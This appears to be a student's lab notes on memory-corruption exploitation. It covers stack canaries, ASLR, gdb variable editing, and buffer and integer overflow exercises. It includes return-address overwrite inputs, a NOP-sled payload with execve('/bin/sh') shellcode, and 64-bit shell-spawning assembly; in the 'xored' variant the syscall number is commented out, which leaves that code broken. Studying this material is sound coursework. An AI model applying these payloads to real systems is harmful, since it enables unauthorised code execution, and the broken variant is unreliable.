

#exrecise 1 Kernal features
version

```bash
$:uname-a
Linux ubuntu 5.8.0-53-generic #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

```

1. Shadow Call Stack and Branch Target Identification for ARM64
2. Stack buffer overflow
    The classic stack buffer overflow involves writing past the expected end of a variable stored on the stack, ultimately writing a controlled value to the stack frame’s stored return address. The most widely used defense is the presence of a stack canary between the stack variables and the return address (CONFIG_STACKPROTECTOR), which is verified just before the function returns. Other defenses include things like shadow stacks.
3. Canaries, blinding, and other secrets
    Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. 
    When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled
    - libc attack fno-stackprotector

4. Memory poisoning
    When releasing memory, it is best to poison the contents, to avoid reuse attacks that rely on the old contents of memory. E.g., clear stack on a syscall return (CONFIG_GCC_PLUGIN_STACKLEAK), wipe heap memory on a free. This frustrates many uninitialized variable attacks, stack content exposures, heap content exposures, and use-after-free attacks.
5. ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, 

## exercise2

1.  __-mpreferred-stack-boundary=2 :__ It has to do with the byte boundaries that your program uses when it is layed out in memory.  What a stack boundary=2 does is ensure that the stack is set up into dword-size increments, this prevents your machine from optimizing the stack.
default is 4.

```bash
(gdb) print /t i
$6 = 0
(gdb) print i
$7 = 0
(gdb) next
9               printf("A string: %s followed by an int %d\n", hello, i);
(gdb) print i
$8 = 32
(gdb) print /t i
$9 = 100000

# print bytes
(gdb) x/1wx &i
0x7fffffffdff4: 0x00000020

(gdb) x/1t &i
0x7fffffffdff4: 00000000000000000000000000100000

# last byte
(gdb) x/1tb &i
0x7fffffffdff4: 00100000

x/4xb &hello
last5 characters
(gdb) print hello
$12 = 0x555555556008 "Hello world!"


```


## exercise 3
1. Change the values of i and hello before the printf command in printHello() is executed (check your changes by printing the variables with commands of gdb).

```
Breakpoint 2, printHello () at example1.c:6
6               char *hello = "Hello world!";
(gdb) set variable hello = "changed"
(gdb) print hello
$15 = 0xf7fcc670 "changed"


```
change single char
```
set variable {char} 0xf7fcc680 = 'b'
```

## Ex4:
```bash
└─$ for i in {1..20}; do echo $i; python -c "print('A'*$i + '\x30\x40\x20\x10')" | ./example2; done                                         6 ⚙
1
buffer: 0xffa84788 pivot: 0xffa8479c
2
buffer: 0xffeea208 pivot: 0xffeea21c
3
buffer: 0xffd58ce8 pivot: 0xffd58cfc
4
buffer: 0xffe54af8 pivot: 0xffe54b0c
5
buffer: 0xff9c9058 pivot: 0xff9c906c
6
buffer: 0xff928b28 pivot: 0xff928b3c
7
buffer: 0xffb0b268 pivot: 0xffb0b27c
8
buffer: 0xffc7b198 pivot: 0xffc7b1ac
9
buffer: 0xffdaa948 pivot: 0xffdaa95c
10
buffer: 0xffd35a58 pivot: 0xffd35a6c
11
buffer: 0xff956338 pivot: 0xff95634c
12
buffer: 0xffbabca8 pivot: 0xffbabcbc
13
buffer: 0xff800568 pivot: 0xff80057c
14
buffer: 0xffae7c88 pivot: 0xffae7c9c
15
buffer: 0xffb0c658 pivot: 0xffb0c66c
16
buffer: 0xff86e018 pivot: 0xff86e02c
17
buffer: 0xffa82a68 pivot: 0xffa82a7c
18
buffer: 0xff931ec8 pivot: 0xff931edc
19
buffer: 0xfffac7a8 pivot: 0xfffac7bc
20
buffer: 0xffd5e3d8 pivot: 0xffd5e3ec
Congratulations! You win!

```


EX5:

```bash
./ex3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA123456789 BB
#seg fault
#256+9bytes
# points to usage function
run $(python -c "print('A'*256 + ' '+ '\xee\x62\x55\x56')")


run $(python -c "print('A'*256 + '\xee\x62\x55\x56' + ' ' +'BV')")

```

```bash
$ /example4 $(python -c "print('A'*268)")     


#use dmesg to find segfault and ip overwrite
$ sudo dmesg | tail 

$ readelf -s example4 | grep -i "usage"   # any function


# payload
run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x2c\xcf\xff\xff')"`

```

```

./integer_overflow -500000000000 $(python3 -c 'print("A"*50000+ "B"*4)')

./integer_overflow 65536 $(python3 -c 'print("A"*106+ "B"*4)')


```
run $(python -c "print('\x90'*208   + '\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\xfc\xce\xff\xff' * 10  )")


## shellcod extracter
```bash
objdump -d exit2.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'
```

Invoking system call with syscall
> The syscall instruction transfers control to the operating system which then performs the requested service

r-64
e-32bit

```nasm
rax   ; system call number ; return code
rdi ;1st argumernt
rsi ; 2n argument
rdx 3rd argument
r10 4th
r8 5th
r9 6th
```

```nasm

global _start

SECTION .text

_start:

  xor rdx,rdx ; clear env
  xor rsi,rsi ; clear  args ; also remove null bytes
  xor rax,rax
  mov rax, 0x68732f6e69622f ; "/bin/sh" = 2f62696e2f7368  - hex value i
  push rax
  ;push   0x68
  ;push   0x7361622f
  ;push   0x6e69622f
  mov rdi,rsp
; rax should contain syscall number - found in manual; also return val 
  mov rax, 0x3b ;syscall execve number - 59  sys_execve (59)
  syscall

; Quit
 
  mov  rbx,0       ; return code
   mov al,1
  
  ;mov  rax,1       ; exit syscall number
  int  0x80        ; syscall

```

##xored
```nasm
global _start

SECTION .text

_start:

  xor rdx,rdx ; clear env
  xor rsi,rsi ; clear  args ; also remove null bytes
  xor rax,rax
  mov rax, 0x68732f6e69622f ; "/bin/sh" = 2f62696e2f7368  - hex value i
  push rax
  ;push   0x68
  ;push   0x7361622f
  ;push   0x6e69622f
  mov rdi,rsp
; rax should contain syscall number - found in manual; also return val 
  xor rax,rax
  
 ; mov al,0x3b
  ;mov rax, 0x3b ;syscall execve number - 59  sys_execve (59)
  syscall

; Quit
  xor rbx,rbx 
  ;mov  rbx,0       ; return code
  xor rax,rax   
  mov al,1
  
  ;mov  rax,1       ; exit syscall number
  int  0x80        ; syscall

```

###xored output shellcode64
```nasm
\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\x0f\x05\x48\x31\xc0\xb0\x01\xcd\x80

```


execve() executes the program referred to by pathname.  This
       causes the program that is currently being run by the calling
       process to be replaced with a new program, with newly initialized
       stack, heap, and (initialized and uninitialized) data segments.


## exercise 6

32 bit shellcode

```nasm


```